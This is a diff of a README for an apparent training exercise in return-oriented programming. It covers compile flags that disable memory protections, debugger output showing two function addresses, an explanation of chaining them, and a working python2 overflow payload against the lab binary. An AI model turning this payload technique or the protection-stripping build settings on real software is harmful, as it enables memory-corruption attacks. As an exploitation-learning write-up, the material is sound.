@@ -1,8 +1,8 @@
-How to compile binary:
+### How to compile binary:
 
 `gcc roplevel1.c -o roplevel1 -fno-stack-protector -z execstack -m32 -no-pie -Wl,-z,norelro -mpreferred-stack-boundary=2`
 
-Analysis:
+### Analysis:
 
 ```
 pwndbg> x secret
@@ -11,13 +11,15 @@ pwndbg> x change
 0x8049186 <change>:	0x53e58955
 ```
 
-Methodolody:
+### Methodolody:
 
 Chain change() and secret() one after the other such that when the main function finishes is returning, it will return to the change function. WHen the change function finishes and is returning, it returns to the secret() function.
 
-Answer:
+### Answer:
 
 `python2 -c "print('A' * 20 + '\x86\x91\x04\x08\xbb\x91\x04\x08' + 'B'*20)" | ./roplevel1`
+
+### Notes
 
 - you have python2 and python3 installed on your system, make sure to run the exploit with python2 as python2 and python3 interpret byte strings `"\x$$"` differently as seen [here](https://stackoverflow.com/questions/60660568/overflowed-bytes-different-than-those-i-see-on-gdb)
 
